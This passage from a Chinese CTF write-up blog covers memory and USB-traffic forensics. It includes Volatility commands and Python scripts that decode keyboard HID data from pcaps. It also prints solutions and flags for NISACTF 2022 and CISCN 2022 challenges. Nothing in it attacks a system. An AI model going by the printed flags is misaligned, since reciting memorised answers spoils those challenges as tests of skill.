<span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">        s = struct.pack(<span class="string">&#x27;B&#x27;</span>, i)</span><br><span class="line">        f.write(s)</span><br></pre></td></tr></table></figure>

<p>vol.py -f file.raw –profile&#x3D;WinXPSP2x86 cmdscan</p>
<p><img src="/img/1721634933789-59.png" alt="img"></p>
<p>password:62b041223bb9a</p>
<p>打开压缩包，类似坐标，绘制二维码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">350</span>, <span class="number">350</span>), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    r = f.read()</span><br><span class="line"></span><br><span class="line">lst = r.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    x = <span class="built_in">int</span>(i.split(<span class="string">&quot; &quot;</span>)[<span class="number">0</span>])</span><br><span class="line">    y = <span class="built_in">int</span>(i.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    im.putpixel((x, y), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">im.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/img/1721634933789-60.png" alt="img"></p>
<p>flag{a6b93e36-f097-11ec-a9b2-5254002d2b31}</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-usb流量分析" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2024/07/22/usb%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="article-date">
      <time datetime="2024-07-22T06:58:22.000Z" itemprop="datePublished">2024-07-22</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2024/07/22/usb%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">usb流量分析</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <span id="more"></span>

<h2 id="usb流量"><a href="#usb流量" class="headerlink" title="usb流量"></a>usb流量</h2><p>简介：</p>
<p>USB流量指的是USB设备接口的流量，攻击者能够通过监听usb接口流量获取键盘敲击键、鼠标移动与点击、存储设备的铭文传输通信、USB无线网卡网络传输内容等等。在CTF中，USB流量分析主要以键盘和鼠标流量为主</p>
<h3 id="NISACTF-2022-破损的flag"><a href="#NISACTF-2022-破损的flag" class="headerlink" title="[NISACTF 2022]破损的flag"></a>[NISACTF 2022]破损的flag</h3><p>键盘流量分析</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">DataFileName = <span class="string">&quot;usb.dat&quot;</span></span><br><span class="line"></span><br><span class="line">presses = []</span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># check argv</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage : &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        python UsbKeyboardHacker.py data.pcap&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Tips : &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        To use this python script , you must install the tshark first.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        You can use `sudo apt-get install tshark` to install it&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Author : &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        If you have any questions , please contact me by email.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;        Thank you for using.&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get argv</span></span><br><span class="line">    pcapFilePath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># get data of pcap</span></span><br><span class="line">    os.system(<span class="string">&quot;tshark -r %s -T fields -e usb.capdata &#x27;usb.data_len == 8&#x27; &gt; %s&quot;</span> % (pcapFilePath, DataFileName))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># read data</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(DataFileName, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            presses.append(line[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># handle</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> press <span class="keyword">in</span> presses:</span><br><span class="line">        <span class="keyword">if</span> press == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> press:</span><br><span class="line">            Bytes = press.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Bytes = [press[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(press), <span class="number">2</span>)]</span><br><span class="line">        <span class="keyword">if</span> Bytes[<span class="number">0</span>] == <span class="string">&quot;00&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">&quot;00&quot;</span> <span class="keyword">and</span> normalKeys.get(Bytes[<span class="number">2</span>]):</span><br><span class="line">                result += normalKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">int</span>(Bytes[<span class="number">0</span>],<span class="number">16</span>) &amp; <span class="number">0b10</span> <span class="keyword">or</span> <span class="built_in">int</span>(Bytes[<span class="number">0</span>],<span class="number">16</span>) &amp; <span class="number">0b100000</span>: <span class="comment"># shift key is pressed.</span></span><br><span class="line">            <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">&quot;00&quot;</span> <span class="keyword">and</span> normalKeys.get(Bytes[<span class="number">2</span>]):</span><br><span class="line">                result += shiftKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Unknow Key : %s&quot;</span> % (Bytes[<span class="number">0</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Found : %s&quot;</span> % (result))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># clean the temp data</span></span><br><span class="line">    os.system(<span class="string">&quot;rm ./%s&quot;</span> % (DataFileName))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="/img/1721631569202-9.png" alt="img"></p>
<p>ujkonjk,tfvbhyhjipokrdcvgrdcvgpokqwsztfvbhujkowazxdqasewsdrpokxdfviklpnjkwsdrrfgyrdcvguhnmkbhjmyhji</p>
<p>根据键盘上所包围住的找出所对应的字符，例如：ujko所包围的字符是i</p>
<p>im gulf flag is welcome t fjnu</p>
<p>NSSCTF{welcome to fjnu}</p>
<h3 id="CISCN-2022-初赛-ez-usb"><a href="#CISCN-2022-初赛-ez-usb" class="headerlink" title="[CISCN 2022 初赛]ez_usb"></a>[CISCN 2022 初赛]ez_usb</h3><p>wireshark里分析可以为usb中的键盘流量</p>
<p><img src="/img/1721631569201-1.png" alt="img"></p>
<p>搜索8个长度的字节包,可以发现其有2.8.1和2.10.1</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usb.data_len == <span class="number">8</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/1721631569201-2.png" alt="img"></p>
<p>使用tshark将其导出</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tshark -r <span class="number">2.</span>pcapng -T fields -e usbhid.data -Y <span class="string">&quot;usb.data_len == 8&quot;</span> -Y <span class="string">&#x27;usb.src ==&quot;2.8.1&quot;&#x27;</span> &gt; <span class="number">1.</span>txt</span><br><span class="line">tshark -r <span class="number">2.</span>pcapng -T fields -e usbhid.data -Y <span class="string">&quot;usb.data_len == 8&quot;</span> -Y <span class="string">&#x27;usb.src ==&quot;2.10.1&quot;&#x27;</span>&gt; <span class="number">2.</span>txt</span><br></pre></td></tr></table></figure>

<p><img src="/img/1721631569201-3.png" alt="img"></p>
<p><img src="/img/1721631569201-4.png" alt="img"></p>
<p>由于导出数据没有加：所以我们要给其加上：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;3.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out3.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>: <span class="comment"># 鼠标流量的话len改为8</span></span><br><span class="line">            out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/1721631569201-5.png" alt="img"></p>
<p>键盘流量转化：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span 